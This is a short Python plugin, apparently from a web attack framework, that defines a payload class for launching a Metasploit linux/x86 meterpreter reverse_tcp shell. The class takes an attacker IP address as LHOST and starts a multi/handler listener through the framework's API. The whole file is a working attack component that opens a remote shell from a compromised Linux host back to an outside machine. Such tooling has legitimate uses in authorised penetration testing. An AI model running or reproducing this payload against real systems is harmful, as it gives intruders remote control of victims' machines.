from plugins.attack.payloads.base_payload import base_payload
from plugins.attack.payloads.payloads.metasploit import metasploit


class msf_linux_x86_meterpreter_reverse(metasploit):
    '''
    This payload creates a reverse meterpreter shell in linux x86 using the metasploit framework.
    '''
    def run_execute(self, parameters):
        
        if len(parameters) != 1:
            return 'Usage: payload msf_reverse_x86_linux <your ip address>'
        
        ip_address = parameters[0]
        
        parameters = 'linux/x86/meterpreter/reverse_tcp LHOST=%s |'
        parameters += ' exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp'
        parameters += ' LHOST=%s E'
        parameters = parameters % (ip_address, ip_address)
        
        parameters = parameters.split(' ')
        
        api_result = self.api_execute(parameters)
        return api_result

